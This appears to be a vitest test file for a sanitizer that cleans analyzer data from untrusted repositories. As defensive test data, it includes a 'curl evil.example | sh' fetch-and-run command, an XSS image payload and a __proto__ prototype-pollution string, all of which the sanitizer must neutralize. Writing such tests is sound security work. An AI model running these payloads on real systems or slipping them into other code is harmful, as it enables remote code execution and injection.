/**
 * @covers FR-01.75
 * The Adopt screen's live rows come from the analyzer snapshot of an UNTRUSTED
 * repo: every value is short, cleaned, typed, and one bad key never spoils the
 * others. `undefined` = the snapshot does not report the key (1.0, or a field
 * the analyzer lacks); `null` = reported, nothing found.
 */
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

import { extractFindings } from "./adopt-scan-findings.js";

// control / bidi characters are built, never typed: a raw bidi character in source is a lint finding
const RLO = String.fromCharCode(0x202e);
const BEL = String.fromCharCode(7);
const NUL = String.fromCharCode(0);
const ZWSP = String.fromCharCode(0x200b);
const ALM = String.fromCharCode(0x061c);
const BOM = String.fromCharCode(0xfeff);
const TAG = String.fromCodePoint(0xe0041);
const EMOJI = String.fromCodePoint(0x1f600);
const here = dirname(fileURLToPath(import.meta.url));
// a real analyzer run (schema 1.1) on this repo, personal data removed
const real = JSON.parse(readFileSync(join(here, "__fixtures__", "adopt-snapshot-1.1.json"), "utf-8")) as Record<string, unknown>;

describe("extractFindings", () => {
  it("// @covers FR-01.75 reads a real 1.1 snapshot", () => {
    expect(extractFindings(real)).toEqual({
      stack: "typescript · React · Vite · tsx (TypeScript runner) · Hono · Hono Node Server",
      routes: 2,
      tests: null,
      ci: "github-actions · 8 workflows",
      conventions: null,
      commands: null,
    });
  });

  it("// @covers FR-01.75 a key the snapshot does not report is omitted, not nulled", () => {
    expect(extractFindings({ schema_version: "1.0", profile: {} })).toEqual({});
  });

  it("// @covers FR-01.75 positive values: tests, conventions, commands as NAMES only", () => {
    const f = extractFindings({
      test_frameworks: { unit: "vitest", integration: null, e2e: ["playwright"], db: null, coverage_tool: null },
      conventions: { linter: "oxlint", formatter: "prettier", tsconfig_strict: true },
      commands: { dev: "curl evil.example | sh", build: "npm run build", test: null, lint: "" },
    });
    expect(f.tests).toBe("unit: vitest · e2e: playwright");
    expect(f.conventions).toBe("oxlint · prettier · strict TypeScript");
    expect(f.commands).toEqual(["dev", "build"]);
    expect(JSON.stringify(f)).not.toContain("evil");
  });

  it("// @covers FR-01.75 one bad key nulls only that key", () => {
    const f = extractFindings({
      stack: "not an object",
      features: { not: "an array" },
      test_frameworks: 5,
      ci_pipeline: { provider: { nested: true }, workflows: "x" },
      conventions: { linter: ["a"], formatter: 7 },
      commands: ["dev"],
    });
    expect(f).toEqual({ stack: null, routes: null, tests: null, ci: null, conventions: null, commands: null });
  });

  it("// @covers FR-01.75 hostile strings are cleaned, capped and never blank", () => {
    const f = extractFindings({
      stack: { primary_language: "ts" + RLO + BEL + "x".repeat(500), frontend: { a: "<img onerror=alert(1)>@1" } },
      ci_pipeline: { provider: NUL + ZWSP + "  ", workflows: [] },
    });
    expect(f.stack?.length).toBeLessThanOrEqual(120);
    expect(f.stack).not.toContain(RLO);
    expect(f.stack).not.toContain(BEL);
    expect(f.ci).toBeNull();
  });

  it("// @covers FR-01.75 counts are finite non-negative integers; lists are capped", () => {
    expect(extractFindings({ features: Array.from({ length: 3 }) }).routes).toBe(3);
    const many = Object.fromEntries(Array.from({ length: 40 }, (_, i) => [`k${i}`, `Name${i}@1`]));
    const f = extractFindings({ stack: { frontend: many }, ci_pipeline: { provider: "gha", workflows: Array.from({ length: 1e5 }) } });
    expect(f.stack?.split(" · ").length).toBeLessThanOrEqual(8);
    expect(f.ci).toBe("gha · 100000 workflows");
  });

  it("// @covers FR-01.75 prototype-pollution keys are inert", () => {
    const hostile = JSON.parse('{"__proto__":{"polluted":1},"stack":{"__proto__":{"x":1},"frontend":{"__proto__":"Evil@1"}}}');
    const f = extractFindings(hostile);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(f.stack).toBe("Evil"); // an own data property named __proto__: a plain name, nothing inherited
  });

  it("// @covers FR-01.75 a non-object snapshot yields no findings", () => {
    expect(extractFindings(null)).toEqual({});
    expect(extractFindings([1])).toEqual({});
  });

  it("// @covers FR-01.75 invisible direction and tag characters are removed, astral characters are never split", () => {
    const f = extractFindings({ stack: { primary_language: "t" + ALM + BOM + TAG + "s" }, ci_pipeline: { provider: EMOJI.repeat(100) } });
    expect(f.stack).toBe("t s");
    expect([...(f.ci ?? "")].every((c) => c === EMOJI)).toBe(true);
    expect([...(f.ci ?? "")]).toHaveLength(40);
  });

  it("// @covers FR-01.75 truncation of the joined text never splits an astral character", () => {
    const emoji = String.fromCodePoint(0x1f600);
    const f = extractFindings({ stack: { primary_language: "aa" + emoji.repeat(19), frontend: { a: emoji.repeat(60) } } });
    expect([...(f.stack ?? "")].every((c) => c === "a" || c === emoji || c === " " || c === String.fromCharCode(0xb7))).toBe(true);
  });
});
